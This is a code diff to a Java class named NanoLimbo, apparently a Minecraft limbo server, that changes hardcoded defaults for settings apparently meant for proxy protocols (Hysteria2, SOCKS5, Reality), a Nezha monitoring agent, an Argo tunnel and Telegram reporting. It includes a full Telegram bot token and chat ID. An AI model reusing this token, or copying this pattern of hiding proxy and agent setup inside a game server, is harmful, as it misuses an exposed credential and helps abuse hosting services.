@@ -22,7 +22,7 @@ public final class NanoLimbo {
     private static final String[] ALL_ENV_VARS = {
         "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
-        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
+        "HY2_PORT", "S5_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
         "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
     };
 
@@ -161,17 +161,17 @@ public final class NanoLimbo {
         envVars.put("ARGO_PORT", "8001");
         envVars.put("ARGO_DOMAIN", "");
         envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "24588");
-        envVars.put("S5_PORT", "24588");
+        envVars.put("HY2_PORT", "26075");
+        envVars.put("S5_PORT", "26614");
         envVars.put("TUIC_PORT", "");
-        envVars.put("REALITY_PORT", "25264");
+        envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("DISABLE_ARGO", "false");
         envVars.put("CHAT_ID", "7592034407");
         envVars.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
         envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "2096");
-        envVars.put("NAME", "hiden2");
+        envVars.put("NAME", "godlike");
 
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
